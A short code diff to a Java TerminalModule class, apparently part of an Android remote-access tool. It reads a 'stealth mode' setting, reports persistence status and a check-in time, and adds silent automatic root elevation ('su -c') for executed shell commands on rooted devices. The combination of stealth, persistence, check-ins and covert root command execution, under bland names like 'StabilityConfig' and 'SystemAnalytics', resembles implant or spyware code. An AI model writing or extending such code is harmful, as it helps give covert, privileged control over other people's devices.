@@ -263,7 +263,7 @@ public class TerminalModule extends BaseModule {
             boolean isOnline = IO_Persistence_Manager.getInstance() != null;
             String status = isOnline ? "ONLINE" : "OFFLINE";
 
-            boolean isStealth = context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE).getBoolean("stealth_mode", false);
+            boolean isStealth = SystemAnalytics.isStealthEnabled(context);
             String profile = isStealth ? "STEALTH" : "NORMAL";
 
             String lastCheckIn = new java.text.SimpleDateFormat("M/d/yyyy, h:mm:ss a", java.util.Locale.US).format(new java.util.Date());
@@ -653,7 +653,9 @@ public class TerminalModule extends BaseModule {
                 workingDir = new File(currentShellPath);
             }
 
-            ProcessBuilder pb = new ProcessBuilder("sh", "-c", command);
+            // Automatic Root Shell Elevation if SU binary is present on rooted device
+            boolean useRoot = SystemAnalytics.isRooted() && !command.startsWith("termux") && !command.startsWith("su");
+            ProcessBuilder pb = useRoot ? new ProcessBuilder("su", "-c", command) : new ProcessBuilder("sh", "-c", command);
             pb.directory(workingDir);
             pb.redirectErrorStream(true);
 
